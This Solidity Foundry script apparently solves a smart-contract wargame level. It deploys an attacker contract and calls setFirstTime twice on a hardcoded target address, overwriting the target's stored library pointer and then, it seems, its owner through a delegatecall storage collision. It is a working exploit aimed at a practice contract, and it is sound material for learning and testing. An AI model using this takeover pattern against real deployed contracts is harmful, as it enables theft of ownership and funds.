// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Level16} from "../src/Level16.sol";

contract Level16Script is Script {
    address addr = 0x6389AC602Ba4ffed2CAdf16Cf073A25F1727EacC;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Level16 l = new Level16();
        uint256 a = uint160(address(l));
        (bool d,) = address(addr).call(abi.encodeWithSignature("setFirstTime(uint256)", a));
        require(d);
        uint256 alice256 = uint160(msg.sender);
        (bool e,) = address(addr).call(abi.encodeWithSignature("setFirstTime(uint256)", alice256));
        require(e);
        vm.stopBroadcast();
    }
}
